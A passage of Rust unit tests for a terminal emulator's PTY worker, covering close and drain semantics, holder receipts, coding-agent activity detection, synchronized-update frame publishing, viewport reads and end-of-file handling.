fn deferred_close_does_not_certify_pty_failure_as_drain() {
    use super::super::ipc::TerminalCloseResult;

    for with_bytes in [false, true] {
        for read_error in [false, true] {
            let (mut worker, events) = capture_worker_for(LaunchRecipe {
                program: "/bin/sh".into(),
                arguments: vec!["-c".into(), "read line; exit 7".into()],
                working_directory: "/".into(),
                environment: Default::default(),
                unset_environment: Default::default(),
            });
            let (commands, receiver) = command_channel(1);
            worker.commands = receiver;
            let handle = TerminalHandle {
                inner: Arc::new(HandleInner {
                    commands,
                    events,
                    published: worker.published.clone(),
                    worker: joins::JoinOwner::empty(worker.published.clone()),
                }),
            };
            worker.writer.write_all(b"release\n").unwrap();
            let report = worker
                .child_exit_rx
                .recv_deadline(Instant::now() + Duration::from_secs(5))
                .unwrap();
            assert_eq!(report.as_ref().unwrap().exit_code(), 7);
            let (exit_relay, exits) = crossbeam_channel::bounded(1);
            exit_relay.send(report).unwrap();
            worker.child_exit_rx = exits;
            // Exercise both direct failure and Bytes coalescing into the
            // same failure. Neither a reader error nor disconnection is EOF.
            let (relay, messages) = crossbeam_channel::bounded(2);
            if with_bytes {
                relay
                    .send(PtyMessage::Bytes(b"FINAL_BEFORE_READ_FAILURE".to_vec()))
                    .unwrap();
            }
            if read_error {
                relay
                    .send(PtyMessage::Error("fixture read failure".into()))
                    .unwrap();
            }
            drop(relay);
            worker.pty_rx = messages;
            let (reply, outcome) = crossbeam_channel::bounded(1);
            handle
                .try_command(Command::CloseChecked {
                    allow_active: true,
                    deadline: Instant::now() + Duration::from_secs(5),
                    reply,
                })
                .unwrap();
            worker.run();
            let refusal = outcome.recv_timeout(Duration::from_secs(1));
            let completed = handle.is_completed();
            let events: Vec<_> = handle.events().try_iter().collect();
            let screen = handle.snapshot();
            let fence = handle.inner.published.input_order.lock().unwrap().handoff;
            drop(handle);
            assert!(matches!(refusal, Ok(TerminalCloseResult::Unknown(_))));
            assert!(!completed && !fence);
            assert!(
                !events
                    .iter()
                    .any(|event| matches!(event, TerminalEvent::Completed { .. }))
            );
            if with_bytes {
                assert!(screen.lines.iter().any(|line| {
                    line.cells
                        .iter()
                        .map(|cell| cell.text.as_str())
                        .collect::<String>()
                        .contains("FINAL_BEFORE_READ_FAILURE")
                }));
            }
        }
    }
}

#[test]
fn deferred_natural_close_keeps_registered_holder_receipt_authority() {
    if isolated_retirement_worker_case() {
        return;
    }
    event_notifier().unwrap();
    super::super::reactor::runtime().unwrap();
    let proof = retirement_test_proof();
    let paths = crate::daemon::RuntimePaths::discover().unwrap();
    let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
    let mut source = shell_session("read line; printf 'REGISTERED_FINAL_OUTPUT\\n'; exit 7");
    source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
        host_session_id: proof.host_session_id.clone(),
        boot_id: proof.boot_id.clone(),
        host_incarnation: proof.host_incarnation.clone(),
    };
    let recovery = crate::terminal::holder::Recovery {
        source: source.clone(),
        previous_sources: Vec::new(),
        relaunches: Vec::new(),
        options: crate::terminal::TerminalSpawnOptions::default(),
        execution_environment: None,
        execution_recipe: None,
    };
    let (commands, inbox) = command_channel(1);
    let (events, event_receiver) = crossbeam_channel::unbounded();
    let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
    let owner = joins::JoinOwner::new(published.clone(), joins::reserve().unwrap());
    let worker_owner = owner.clone();
    let worker_published = published.clone();
    let worker_source = source.clone();
    let (ready, initialized) = crossbeam_channel::bounded(1);
    let (release, start) = crossbeam_channel::bounded(1);
    let worker = thread::spawn(move || {
        // A genuine native join, holder release and durable receipt are
        // required here; the raw command fixture's empty owner is insufficient.
        let _body = joins::BodyCompletion(worker_owner);
        let mut worker = Worker::start(
            worker_source,
            TerminalConfig {
                holder_recovery: Some(recovery),
                ..TerminalConfig::default()
            },
            None,
            inbox,
            events,
            worker_published,
        )
        .unwrap()
        .0;
        worker.writer.write_all(b"release\n").unwrap();
        let report = worker
            .child_exit_rx
            .recv_deadline(Instant::now() + Duration::from_secs(5))
            .unwrap();
        assert_eq!(report.as_ref().unwrap().exit_code(), 7);
        assert!(!worker.child.unreaped());
        let (relay, exits) = crossbeam_channel::bounded(1);
        relay.send(report).unwrap();
        worker.child_exit_rx = exits;
        let _ = ready.send(());
        // Disconnect also releases the actual worker on assertion unwind.
        let _ = start.recv();
        worker.run();
    });
    owner.install(worker);
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events: event_receiver,
            published,
            worker: owner,
        }),
    };
    initialized.recv_timeout(Duration::from_secs(5)).unwrap();
    let record = handle.holder_identity().unwrap().clone();
    assert!(record.holder.is_current() && !record.root.is_current());
    assert!(!handle.is_completed());
    let mut wrong_proof = proof.clone();
    wrong_proof.host_incarnation =
        crate::model::HostIncarnation::new(uuid::Uuid::new_v4().to_string());
    assert!(crate::terminal::holder::cleanup::authorize(&wrong_proof).is_err());
    let closed = thread::scope(|scope| {
        let close = scope.spawn(|| handle.close_with_receipt(&source, &proof));
        // Observe the real public request's priority admission before
        // allowing the worker to consume its queued genuine root report.
        let deadline = Instant::now() + Duration::from_secs(5);
        let admitted = loop {
            if handle
                .inner
                .published
                .priority_close
                .lock()
                .unwrap()
                .is_some()
            {
                break true;
            }
            if handle
                .inner
                .published
                .capture_rx
                .recv_deadline(deadline)
                .is_err()
            {
                break false;
            }
        };
        let _ = release.send(());
        let result = close.join().unwrap();
        assert!(
            admitted,
            "public checked close must precede the worker loop"
        );
        result
    });
    let completed = handle.is_completed();
    let joined = handle.worker_joined_for_test();
    let screen = handle.snapshot();
    let events: Vec<_> = handle.events().try_iter().collect();
    let confirmed = crate::terminal::holder::cleanup::confirmed(&source, &record, &proof);
    let mut wrong_source = source.clone();
    wrong_source
        .launch
        .arguments
        .push("different source".into());
    let wrong_source_confirmed =
        crate::terminal::holder::cleanup::confirmed(&wrong_source, &record, &proof);
    let mut wrong_record = record.clone();
    wrong_record.holder.start += 1;
    let wrong_holder_confirmed =
        crate::terminal::holder::cleanup::confirmed(&source, &wrong_record, &proof);
    drop(handle);
    assert!(closed.is_ok(), "{closed:?}");
    assert!(
        completed && joined,
        "public success requires actual worker teardown and join"
    );
    assert_eq!(confirmed, Ok(true));
    assert_eq!(wrong_source_confirmed, Ok(false));
    assert_eq!(wrong_holder_confirmed, Ok(false));
    assert!(screen.lines.iter().any(|line| {
        line.cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .contains("REGISTERED_FINAL_OUTPUT")
    }));
    assert_eq!(
        events
            .iter()
            .filter(|event| matches!(
                event,
                TerminalEvent::Completed {
                    exit_code: 7,
                    signal: None,
                    intentional: false,
                }
            ))
            .count(),
        1
    );
}

#[test]
fn fresh_omp_activity_does_not_require_a_resumable_session() {
    use crate::agent::{Activity, ActivityState, Provider};
    use std::time::Instant;
    let directory = tempdir().unwrap();
    let executable = directory.path().join("omp");
    symlink("/bin/sleep", &executable).unwrap();
    let (mut worker, events) = capture_worker_for(LaunchRecipe {
        unset_environment: Default::default(),
        program: executable.to_str().unwrap().into(),
        arguments: vec!["10".into()],
        working_directory: directory.path().into(),
        environment: BTreeMap::from([
            ("HOME".into(), directory.path().to_str().unwrap().into()),
            (
                "PI_CODING_AGENT_DIR".into(),
                directory.path().to_str().unwrap().into(),
            ),
        ]),
    });
    let deadline = Instant::now() + Duration::from_secs(3);
    let process = loop {
        if let Some(process) = worker.observe_agent_process().cloned() {
            break process;
        }
        assert!(Instant::now() < deadline, "PTY foreground never became OMP");
        std::thread::sleep(Duration::from_millis(1));
    };
    let tty = std::fs::read_link(format!("/proc/{}/fd/0", process.pid)).unwrap();
    let markers = directory.path().join("terminal-sessions");
    std::fs::create_dir(&markers).unwrap();
    std::fs::write(
        markers.join(format!(
            "pts-{}",
            tty.file_name().unwrap().to_str().unwrap()
        )),
        format!(
            "{}\n{}\n",
            directory.path().display(),
            directory
                .path()
                .join("sessions/fresh_12345678-1234-1234-1234-123456789abc.jsonl")
                .display()
        ),
    )
    .unwrap();
    worker.handle_command(Command::Hide);
    let generation = worker.generation;
    for title in ["π ⠋ fresh", "π ⠙ fresh", "π ! fresh", "π > fresh"] {
        worker.process_output(format!("\x1b]2;{title}\x07").into_bytes());
        assert!(
            worker
                .resume_hint
                .as_deref()
                .and_then(crate::model::agent_recovery::recipe_from_hint)
                .is_none(),
            "recognizing a fresh agent must not grant resume authority"
        );
    }
    let activity = events
        .try_iter()
        .filter_map(|event| match event {
            TerminalEvent::AgentActivityChanged(activity) => Some(activity),
            _ => None,
        })
        .collect::<Vec<_>>();
    assert_eq!(
        activity,
        [
            ActivityState::Unknown,
            ActivityState::Working,
            ActivityState::Waiting,
            ActivityState::Idle
        ]
        .map(|state| Some(Activity {
            provider: Provider::Omp,
            state
        }))
    );
    assert_eq!(
        worker.generation, generation,
        "hidden activity must not render"
    );
    worker.run();
}

#[test]
fn activity_application_rejects_replaced_processes_and_expired_results() {
    use crate::agent::{Activity, ActivityState, Provider};
    use std::time::Instant;
    let directory = tempdir().unwrap();
    let executable = directory.path().join("claude");
    // A harmless native executable with recognizable argv; no provider I/O.
    symlink("/bin/sleep", &executable).unwrap();
    let (mut worker, _) = capture_worker_for(LaunchRecipe {
        unset_environment: Default::default(),
        program: executable.to_str().unwrap().into(),
        arguments: vec!["10".into()],
        working_directory: directory.path().into(),
        environment: BTreeMap::new(),
    });
    let startup_deadline = Instant::now() + Duration::from_secs(3);
    let process = loop {
        if let Some(process) = worker.observe_agent_process().cloned() {
            break process;
        }
        assert!(
            Instant::now() < startup_deadline,
            "PTY foreground never became Claude"
        );
        std::thread::sleep(Duration::from_millis(1));
    };
    let unknown = Some(Activity {
        provider: Provider::Claude,
        state: ActivityState::Unknown,
    });
    assert_eq!(
        *worker.published.agent_activity.lock().unwrap(),
        unknown,
        "a fresh foreground agent has identity before it reports activity"
    );
    let (reply, result) = crossbeam_channel::bounded(1);
    worker.handle_command(Command::ApplyAgentActivity {
        process: process.clone(),
        activity: None,
        title: None,
        reply,
        deadline: Instant::now() + Duration::from_secs(3),
    });
    assert_eq!(
        result.recv().unwrap(),
        unknown,
        "unavailable provider state must not erase a confirmed live identity"
    );
    let working = Some(Activity {
        provider: Provider::Claude,
        state: ActivityState::Working,
    });
    let apply = |worker: &mut Worker, process: AgentProcess, deadline| {
        let (reply, result) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::ApplyAgentActivity {
            process,
            activity: working,
            title: None,
            reply,
            deadline,
        });
        result.recv().unwrap()
    };
    let deadline = || std::time::Instant::now() + Duration::from_secs(3);
    assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
    let discovery_count =
        || crate::model::agent_recovery::FOREGROUND_AGENT_OBSERVATIONS.with(std::cell::Cell::get);
    let before = discovery_count();
    for _ in 0..100 {
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
    }
    assert_eq!(
        discovery_count(),
        before,
        "unchanged samples must not descend /proc again"
    );
    let mut replaced = process.clone();
    replaced.start = replaced.start.wrapping_add(1);
    assert_eq!(apply(&mut worker, replaced, deadline()), None);
    assert_eq!(
        *worker
            .published
            .agent_activity
            .lock()
            .unwrap_or_else(|error| error.into_inner()),
        None
    );
    assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
    let mut other_process = process.clone();
    other_process.pid += 1;
    assert_eq!(apply(&mut worker, other_process, deadline()), None);
    assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
    assert_eq!(
        apply(&mut worker, process.clone(), std::time::Instant::now()),
        None
    );
    worker.adopt_agent_process(Some(process));
    worker.set_agent_activity(working);
    worker.adopt_agent_process(None);
    assert_eq!(
        *worker.published.agent_activity.lock().unwrap(),
        None,
        "a shell cannot retain the previous agent identity"
    );
    // The disconnected command channel drives normal kill/reap teardown.
    worker.run();
}

#[test]
fn parser_metadata_storm_is_collapsed_before_semantic_delivery() {
    let (mut worker, events) = capture_worker();
    let mut output = vec![b'\x07'; 1024 * 1024];
    for index in 0..10_000 {
        output.extend_from_slice(format!("\x1b]2;title-{index}\x07").as_bytes());
    }
    worker.process_output(output);
    assert_eq!(
        events.try_iter().collect::<Vec<_>>(),
        vec![
            TerminalEvent::Bell,
            TerminalEvent::TitleChanged("title-9999".into()),
        ]
    );
    worker.run();
}

#[test]
fn bells_publish_promptly_then_keep_one_pending_reminder() {
    let now = std::time::Instant::now();
    let mut bell = Bell::default();
    bell.pending = true;
    assert!(bell.take_ready(now));
    for _ in 0..10_000 {
        bell.pending = true;
        assert!(!bell.take_ready(now + BELL_INTERVAL / 2));
    }
    assert!(bell.take_ready(now + BELL_INTERVAL));
    assert!(!bell.pending);
    assert!(!bell.take_ready(now + 2 * BELL_INTERVAL));
}

#[test]
fn capture_credit_coalesces_batches_and_preserves_semantic_events() {
    let (mut worker, events) = capture_worker();
    worker.publish_snapshot(true);
    let first = worker.generation;
    worker.process_output(b"old".to_vec());
    worker.process_output(b"\r\x1b[2Klatest\x07\x1b]2;title\x07".to_vec());
    assert_eq!(worker.generation, first);
    assert_eq!(
        worker
            .published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner())
            .unwrap()
            .sequence,
        2
    );
    assert_eq!(
        events.try_iter().collect::<Vec<_>>(),
        vec![
            TerminalEvent::Bell,
            TerminalEvent::TitleChanged("title".into())
        ]
    );
    worker.published.acknowledge(first);
    worker.capture_if_ready();
    let snapshot = worker.published.snapshot.load_full();
    assert_eq!(
        snapshot.lines[0]
            .cells
            .iter()
            .take(6)
            .map(|cell| cell.text.as_str())
            .collect::<String>(),
        "latest"
    );
    assert_eq!(snapshot.activity.unwrap().sequence, 2);
    // Returning old credit cannot buy an extra snapshot.
    worker.process_output(b"!".to_vec());
    worker.published.acknowledge(first);
    worker.capture_if_ready();
    assert_eq!(worker.generation, first + 1);
    worker.published.acknowledge(first + 1);
    worker.capture_if_ready();
    assert_eq!(worker.published.snapshot.load().lines[0].cells[6].text, "!");
    // An ACK arriving before the next output also cannot strand that output.
    worker.published.acknowledge(worker.generation);
    worker.process_output(b"?".to_vec());
    assert_eq!(worker.published.snapshot.load().lines[0].cells[7].text, "?");
    worker.published.acknowledge(worker.generation);
    let previous = worker.published.snapshot.load_full();
    worker.process_output(b"\x1b[31m".to_vec());
    let activity_only = worker.published.snapshot.load_full();
    assert_eq!(activity_only.lines, previous.lines);
    assert!(activity_only.activity.unwrap().sequence > previous.activity.unwrap().sequence);
    worker.run();
}

fn published_row(worker: &Worker, row: usize) -> String {
    worker.published.snapshot.load().lines[row]
        .cells
        .iter()
        .map(|cell| cell.text.as_str())
        .collect::<String>()
        .trim_end()
        .to_owned()
}

/// Returns the consumer's credit for whatever is published, as a presented
/// frame would.
fn present(worker: &Worker) {
    worker.published.acknowledge(worker.generation);
}

#[test]
fn synchronized_update_publishes_only_its_finished_frame() {
    let (mut worker, _) = capture_worker();
    worker.process_output(b"old frame".to_vec());
    worker.publish_snapshot(true);
    present(&worker);
    let before = worker.generation;

    // A TUI repainting after SIGWINCH clears the screen inside the update.
    // Reads split the repaint anywhere, so the clear can arrive alone.
    worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2J".to_vec());
    assert_eq!(
        worker.generation, before,
        "the cleared screen was published"
    );
    assert_eq!(published_row(&worker, 0), "old frame");
    assert!(worker.synchronized_release_after().is_some());
    worker.process_output(b"new ".to_vec());
    // Credit returning mid-update cannot publish the half-drawn frame either.
    worker.capture_if_ready();
    assert_eq!(worker.generation, before);

    worker.process_output(b"frame\x1b[?2026l".to_vec());
    assert_eq!(worker.generation, before + 1);
    assert_eq!(published_row(&worker, 0), "new frame");
    assert_eq!(worker.synchronized_release_after(), None);
    worker.run();
}

#[test]
fn independent_viewport_can_read_a_dirty_parser_without_ack_deadlock() {
    let (mut worker, _) = capture_worker();
    worker.process_output(b"first frame".to_vec());
    worker.publish_snapshot(true);
    worker.process_output(b"\rnew frame".to_vec());
    assert!(worker.capture_dirty);
    let (reply, receive) = crossbeam_channel::bounded(1);
    worker.handle_command(Command::ReadViewport {
        offset: Some(0),
        rows: Some(10),
        reply,
    });
    let capture = receive
        .recv_timeout(Duration::from_secs(1))
        .unwrap()
        .unwrap();
    assert_eq!(capture.generation, worker.generation);
    let text = capture.lines[0]
        .cells
        .iter()
        .map(|cell| cell.text.as_str())
        .collect::<String>();
    assert!(text.starts_with("new frame"));
    worker.run();
}

#[test]
fn independent_viewport_waits_for_the_complete_synchronized_frame() {
    let (mut worker, _) = capture_worker();
    worker.process_output(b"old frame".to_vec());
    worker.publish_snapshot(true);
    present(&worker);
    worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2Jpartial".to_vec());
    let (reply, receive) = crossbeam_channel::bounded(1);
    worker.handle_command(Command::ReadViewport {
        offset: Some(0),
        rows: Some(10),
        reply,
    });
    assert!(receive.try_recv().is_err());
    worker.process_output(b" frame\x1b[?2026l".to_vec());
    let capture = receive
        .recv_timeout(Duration::from_secs(1))
        .unwrap()
        .unwrap();
    assert_eq!(capture.generation, worker.generation);
    let text = capture.lines[0]
        .cells
        .iter()
        .map(|cell| cell.text.as_str())
        .collect::<String>();
    assert!(text.starts_with("partial frame"));
    worker.run();
}

/// A snapshot is admitted only while its read is queued, so the read a
/// redraw asked for can still be waiting inside a synchronized update when
/// a handoff reaches this worker. `handoff` sends the handoff command and
/// returns its error, if any.
fn assert_waiting_read_settled_by(handoff: impl FnOnce(&mut Worker) -> Option<String>) {
    let (mut worker, _) = capture_worker();
    worker.process_output(b"old frame".to_vec());
    worker.publish_snapshot(true);
    present(&worker);
    worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2Jpartial".to_vec());
    let (read, answer) = crossbeam_channel::bounded(1);
    worker.handle_command(Command::ReadViewport {
        offset: Some(0),
        rows: Some(10),
        reply: read,
    });
    assert!(answer.try_recv().is_err(), "the read did not wait");

    let error = handoff(&mut worker);
    let capture = answer
        .recv_timeout(Duration::from_secs(1))
        .expect("the waiting read was left unanswered")
        .unwrap();
    let text = capture.lines[0]
        .cells
        .iter()
        .map(|cell| cell.text.as_str())
        .collect::<String>();
    assert!(text.starts_with("partial"), "{text:?}");
    if let Some(error) = error {
        assert!(
            !error.contains("still pending"),
            "a viewport read held back the handoff: {error}"
        );
    }
    worker.run();
}

#[test]
fn a_viewport_read_waiting_for_a_synchronized_frame_does_not_hold_back_upgrade_preparation() {
    assert_waiting_read_settled_by(|worker| {
        let (reply, prepared) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::PrepareUpgrade(reply));
        prepared.recv_timeout(Duration::from_secs(5)).unwrap().err()
    });
}

#[test]
fn a_viewport_read_waiting_for_a_synchronized_frame_does_not_hold_back_a_carry() {
    // This worker has no holder to detach into, so the carry still fails,
    // but only after its drain checks have passed.
    assert_waiting_read_settled_by(|worker| {
        let (reply, carried) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::Carry {
            socket: PathBuf::from("/nonexistent/carry.sock"),
            reply,
        });
        carried.recv_timeout(Duration::from_secs(5)).unwrap().err()
    });
}

#[test]
fn synchronized_update_left_open_is_released_after_its_timeout() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    present(&worker);
    let before = worker.generation;

    worker.process_output(b"\x1b[?2026hstuck".to_vec());
    assert_eq!(worker.generation, before);
    let release = worker.synchronized_release_after().unwrap();
    assert!(release <= SYNCHRONIZED_OUTPUT_TIMEOUT);

    worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
    // A lapsed hold needs no timer, even while the grid is still dirty.
    assert_eq!(worker.synchronized_release_after(), None);
    worker.capture_if_ready();
    assert_eq!(worker.generation, before + 1);
    assert_eq!(published_row(&worker, 0), "stuck");
    assert_eq!(worker.synchronized_release_after(), None);
    worker.run();
}

#[test]
fn an_update_restarted_while_credit_is_owed_gets_its_own_hold() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    present(&worker);
    worker.process_output(b"old".to_vec());
    let published = worker.generation;
    assert_eq!(published_row(&worker, 0), "old");

    // The consumer still owes credit for that frame while an update runs
    // long enough that its own hold would have lapsed.
    worker.process_output(b"\x1b[?2026hhalf".to_vec());
    worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
    // One read ends it and begins the next; no capture sees the gap.
    worker.process_output(b" done\x1b[?2026l\x1b[?2026hnext".to_vec());
    present(&worker);
    worker.capture_if_ready();
    assert_eq!(
        worker.generation, published,
        "the next update's half-drawn frame was published"
    );
    assert_eq!(published_row(&worker, 0), "old");

    worker.process_output(b" frame\x1b[?2026l".to_vec());
    assert_eq!(worker.generation, published + 1);
    assert_eq!(published_row(&worker, 0), "oldhalf donenext frame");
    worker.run();
}

#[test]
fn a_revealed_card_gives_the_update_in_progress_a_full_hold() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    present(&worker);
    worker.process_output(b"\x1b[?2026hhalf".to_vec());
    // An update seen long ago, before the card went away.
    worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
    worker.handle_command(Command::Hide);
    let before = worker.generation;

    worker.handle_command(Command::Reveal);
    assert_eq!(worker.generation, before, "a half-drawn frame was revealed");
    worker.process_output(b" done\x1b[?2026l".to_vec());
    assert_eq!(published_row(&worker, 0), "half done");
    worker.run();
}

/// A reveal shows the terminal before its capture is published, and an
/// update in progress holds that capture back. A read that asked to see
/// the terminal meanwhile must show what arrived while it was hidden, not
/// the screen from before (#2521).
#[test]
fn a_read_during_a_reveal_shows_output_from_while_hidden() {
    let (mut worker, _) = capture_worker();
    worker.process_output(b"before".to_vec());
    worker.publish_snapshot(true);
    present(&worker);
    worker.handle_command(Command::Hide);
    worker.process_output(b"\r\nwhile hidden\x1b[?2026h".to_vec());
    worker.handle_command(Command::Reveal);
    assert!(worker.published.visible.load(Ordering::Acquire));
    assert_eq!(published_row(&worker, 1), "", "the reveal was not held");

    let (commands, pending) = command_channel(1);
    let published = Arc::clone(&worker.published);
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events: crossbeam_channel::never(),
            worker: joins::JoinOwner::empty(Arc::clone(&published)),
            published,
        }),
    };
    let read = std::thread::spawn(move || handle.viewport_snapshot(None, None, true));
    let command = pending
        .recv_timeout(Duration::from_secs(5))
        .expect("the read was answered with the screen from before");
    worker.handle_command(command);
    worker.process_output(b"\x1b[?2026l".to_vec());
    let screen = read.join().unwrap().unwrap();
    let row = screen.lines[1]
        .cells
        .iter()
        .map(|cell| cell.text.as_str())
        .collect::<String>();
    assert_eq!(row.trim_end(), "while hidden");
    worker.run();
}

fn completed_without_history(hibernated: bool) -> (TerminalHandle, Receiver<TerminalEvent>) {
    let (mut worker, events) = capture_worker();
    worker.process_output(b"before".to_vec());
    worker.publish_snapshot(true);
    present(&worker);
    worker.handle_command(if hibernated {
        Command::Hibernate
    } else {
        Command::Hide
    });
    worker.process_output(b"\r\nfinished while away".to_vec());
    let published = Arc::clone(&worker.published);
    // Observe natural PTY EOF and child exit, rather than shutting down
    // through the command channel. Fault only the archive byte budget.
    let (commands, receiver) = command_channel(8);
    worker.commands = receiver;
    archive::with_capture_budget(0, || worker.run());
    assert!(published.completed.load(Ordering::Acquire));
    assert!(matches!(
        &*published.archive.lock().unwrap(),
        ArchivePhase::Frozen {
            history: Err(_),
            ..
        }
    ));
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events: events.clone(),
            worker: joins::JoinOwner::empty(Arc::clone(&published)),
            published,
        }),
    };
    (handle, events)
}

#[test]
fn completed_without_history_retains_output_produced_while_away() {
    for hibernated in [false, true] {
        let (handle, events) = completed_without_history(hibernated);
        let screen = handle.snapshot();
        assert!(!screen.detached);
        assert!(screen.lines.iter().any(|row| {
            row.cells
                .iter()
                .map(|cell| cell.text.as_str())
                .collect::<String>()
                .contains("finished while away")
        }));
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(
                    event,
                    TerminalEvent::Error {
                        operation: "retain completed terminal history",
                        ..
                    }
                ))
                .count(),
            1
        );
    }
}

#[test]
fn completed_without_history_visibility_commands_do_not_repeat_the_loss() {
    for hibernated in [false, true] {
        let (handle, events) = completed_without_history(hibernated);
        let _: Vec<_> = events.try_iter().collect();
        for _ in 0..3 {
            handle.hide().unwrap();
            handle.hibernate().unwrap();
            handle.reveal().unwrap();
            handle.restore(false).unwrap();
            handle.restore(true).unwrap();
            handle.focus(false).unwrap();
            handle.focus(true).unwrap();
            assert!(
                events
                    .try_iter()
                    .all(|event| !matches!(event, TerminalEvent::Error { .. }))
            );
        }
    }
}

#[test]
fn completed_without_history_presentation_refresh_does_not_repeat_loss() {
    for hibernated in [false, true] {
        let (handle, events) = completed_without_history(hibernated);
        let _: Vec<_> = events.try_iter().collect();
        for _ in 0..3 {
            // HostState refreshes focus and the size owner's saved size
            // when revealing/focusing a completed terminal.
            handle.set_host_visibility(super::super::ipc::TerminalVisibility::Visible);
            handle.focus(true).unwrap();
            handle
                .resize(TerminalSize {
                    columns: 80,
                    rows: 24,
                    cell_width_px: 8,
                    cell_height_px: 16,
                })
                .unwrap();
            handle.set_theme(TerminalTheme::Light).unwrap();
            handle.scroll_to_top().unwrap();
            handle.clear_scrollback().unwrap();
            assert!(
                events
                    .try_iter()
                    .all(|event| !matches!(event, TerminalEvent::Error { .. }))
            );
        }
    }
}

#[test]
fn completed_without_history_answers_repeated_viewport_reads() {
    for hibernated in [false, true] {
        let (handle, events) = completed_without_history(hibernated);
        let _: Vec<_> = events.try_iter().collect();
        handle.set_host_visibility(super::super::ipc::TerminalVisibility::Visible);
        for _ in 0..3 {
            let screen = handle.viewport_snapshot(Some(0), Some(1), true).unwrap();
            assert!(!screen.detached);
            assert!(screen.rows > 0);
            assert!(
                events
                    .try_iter()
                    .all(|event| !matches!(event, TerminalEvent::Error { .. }))
            );
        }
    }
}

/// Nothing is published after a terminal completes, so a terminal that
/// completed hidden, without history to replace its screen, is shown with
/// what it published: no trip to the archive, and no error for each read.
#[test]
fn a_shown_read_of_a_terminal_that_completed_hidden_shows_its_last_screen() {
    let fixture = RenderStreamFixture::new(|_| {});
    let published = &fixture.handle.inner.published;
    let mut screen = RenderSnapshot::empty();
    screen.generation = 1;
    screen.rows = 1;
    published.publish(Arc::new(screen));
    published.stop_presenting();
    published.freeze(
        Err("The completed terminal view is unavailable".into()),
        Arc::clone(&fixture.events),
    );
    fixture
        .handle
        .set_host_visibility(super::super::ipc::TerminalVisibility::Visible);

    let read = fixture.handle.viewport_snapshot(None, None, true).unwrap();
    assert_eq!(read.generation, 1);
    assert!(
        fixture.handle.events().try_recv().is_err(),
        "the read went to an archive without history"
    );
}

#[test]
fn a_resize_shows_its_reflow_at_once_and_holds_the_repaint_it_prompts() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    present(&worker);
    let before = worker.generation;
    worker.process_output(b"\x1b[?2026hpending".to_vec());
    assert_eq!(worker.generation, before);

    // The parser ends an update on resize, as Ghostty does, so the new
    // size is never held back behind the old one's frame.
    worker.resize(TerminalSize {
        columns: 40,
        rows: 10,
        cell_width_px: 8,
        cell_height_px: 16,
    });
    assert_eq!(worker.generation, before + 1);
    assert_eq!(worker.published.snapshot.load().columns, 40);
    present(&worker);

    // The child answers SIGWINCH by clearing and repainting inside a new
    // update; only the repainted frame is published.
    worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2J".to_vec());
    assert_eq!(worker.generation, before + 1);
    worker.process_output(b"repainted\x1b[?2026l".to_vec());
    assert_eq!(worker.generation, before + 2);
    assert_eq!(published_row(&worker, 0), "repainted");
    worker.run();
}

#[test]
fn exit_publishes_a_final_grid_left_inside_an_update() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    present(&worker);
    worker.process_output(b"\x1b[?2026hlast words".to_vec());
    let published = Arc::clone(&worker.published);
    // Keep the command channel connected so child EOF, not client
    // teardown, ends the worker loop.
    let (_commands, receiver) = command_channel(1);
    worker.commands = receiver;
    worker.run();
    assert_eq!(
        published.snapshot.load().lines[0]
            .cells
            .iter()
            .take(10)
            .map(|cell| cell.text.as_str())
            .collect::<String>(),
        "last words"
    );
}

#[test]
fn a_withheld_update_wakes_the_worker_after_the_child_exits() {
    let (_command_tx, command_rx) = command_channel(1);
    let (_pty_tx, pty_rx) = crossbeam_channel::bounded::<PtyMessage>(1);
    let (_child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);
    assert!(matches!(
        wait_for_worker_event(
            &command_rx,
            &pty_rx,
            &child_exit_rx,
            &crossbeam_channel::never(),
            true,
            false,
            FOREGROUND_POLL_MAX,
            Some(Duration::from_millis(1)),
        ),
        WorkerEvent::Timer
    ));
}

#[test]
fn eof_preserves_final_grid_without_outstanding_consumer_credit() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    worker.process_output(b"final".to_vec());
    let published = Arc::clone(&worker.published);
    // Keep the command channel connected so child EOF, not client teardown,
    // ends the worker loop.
    let (_commands, receiver) = command_channel(1);
    worker.commands = receiver;
    worker.run();
    assert_eq!(
        published.snapshot.load().lines[0]
            .cells
            .iter()
            .take(5)
            .map(|cell| cell.text.as_str())
            .collect::<String>(),
        "final"
    );
}

#[test]
fn hidden_eof_preserves_final_contents_without_visual_wakes() {
    let (mut worker, _) = capture_worker();
    worker.set_hidden();
    worker.process_output(b"hidden".to_vec());
    assert_eq!(worker.generation, 0);
    let published = Arc::clone(&worker.published);
    let (_commands, receiver) = command_channel(1);
    worker.commands = receiver;
    worker.run();
    assert_eq!(published.announced_generation.load(Ordering::Acquire), 0);
    assert_eq!(
        published.snapshot.load().lines[0]
            .cells
            .iter()
            .take(6)
            .map(|cell| cell.text.as_str())
